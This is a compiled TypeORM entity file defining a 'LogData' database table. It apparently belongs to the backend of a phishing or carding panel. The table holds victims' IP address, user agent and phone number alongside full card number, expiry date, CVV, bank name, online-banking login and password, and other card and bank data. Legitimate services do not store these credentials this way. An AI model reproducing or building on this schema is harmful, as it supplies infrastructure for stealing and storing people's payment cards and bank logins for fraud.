"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.LogData = void 0;
const typeorm_1 = require("typeorm");
const logs_1 = require("../../database/models/logs");
let LogData = class LogData {
    id;
    ip;
    userAgent;
    phone;
    cardNumber;
    cardDate;
    cardCVV;
    cardBankName;
    bankName;
    bankLogin;
    bankPassword;
    bankOtherData;
    cardInfo;
    log;
};
exports.LogData = LogData;
__decorate([
    (0, typeorm_1.PrimaryGeneratedColumn)(),
    __metadata("design:type", Number)
], LogData.prototype, "id", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'ip', type: 'text', unique: false }),
    __metadata("design:type", String)
], LogData.prototype, "ip", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'userAgent', type: 'text', unique: false }),
    __metadata("design:type", String)
], LogData.prototype, "userAgent", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'phone', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "phone", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'cardNumber', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "cardNumber", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'cardDate', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "cardDate", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'cardCVV', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "cardCVV", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'cardBankName', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "cardBankName", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'bankName', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "bankName", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'bankLogin', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "bankLogin", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'bankPassword', type: 'text', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "bankPassword", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'bankOtherData', type: 'longtext', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "bankOtherData", void 0);
__decorate([
    (0, typeorm_1.Column)({ name: 'cardInfo', type: 'longtext', unique: false, default: null }),
    __metadata("design:type", String)
], LogData.prototype, "cardInfo", void 0);
__decorate([
    (0, typeorm_1.ManyToOne)(() => logs_1.Logs),
    (0, typeorm_1.JoinColumn)(),
    __metadata("design:type", logs_1.Logs)
], LogData.prototype, "log", void 0);
exports.LogData = LogData = __decorate([
    (0, typeorm_1.Entity)()
], LogData);
